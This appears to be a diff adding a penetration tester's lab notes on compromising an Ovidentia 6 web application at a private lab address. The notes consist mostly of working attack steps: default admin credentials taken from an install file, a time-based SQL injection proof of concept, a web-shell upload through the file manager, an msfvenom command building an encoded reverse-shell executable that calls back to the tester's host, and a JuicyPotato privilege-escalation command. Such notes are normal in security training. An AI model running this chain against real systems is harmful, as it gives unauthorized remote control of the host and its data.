@@ -1,0 +1,45 @@
+# port 8080 web interface
+/index.php -> permission deny
+/php              
+/robots.txt 
+
+# robots.txt
+User-agent: *
+Disallow: /testmysql.php
+
+User-agent: *
+Allow: /PHP/
+
+# version and password acquired
+http://10.11.1.73:8080/php/install/install.txt
+
+OVIDENTIA 6.x
+
+# login page
+http://10.11.1.73:8080/php/index.php?tg=login&cmd=authform&msg=Login&err=
+
+User    : admin@admin.bab # found on install.txt
+Password: 012345678
+
+# SQli found
+Ovidentia 6 - 'id' SQL injection (Authenticated)    | php/webapps/49707.txt
+#POC
+http://10.11.1.73:8080/php/index.php?tg=delegat&idx=mem&id=1 AND (SELECT * FROM (SELECT(sleep(5)))QwTg)
+
+# sites->Ovidentia->File upload configuration
+setup a new upload path -> C:\wamp\www\PHP\test
+
+# file manager->add
+create your own folder
+
+# back to File upload configuration to change path to trigger error and get the location of uploaded files 
+C:/wamp/www/PHP/test/fileManager/collectives/DG0/test/<file>
+
+# upload web shell and get shell
+
+# PE payload
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.205 LPORT=4444 -e x86/shikata_ga_nai -f exe -o payload.exe
+
+# get shell
+.\Juicy.Potato.x86.exe -p C:\users\public\documents\payload.exe -l 4444 -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
+
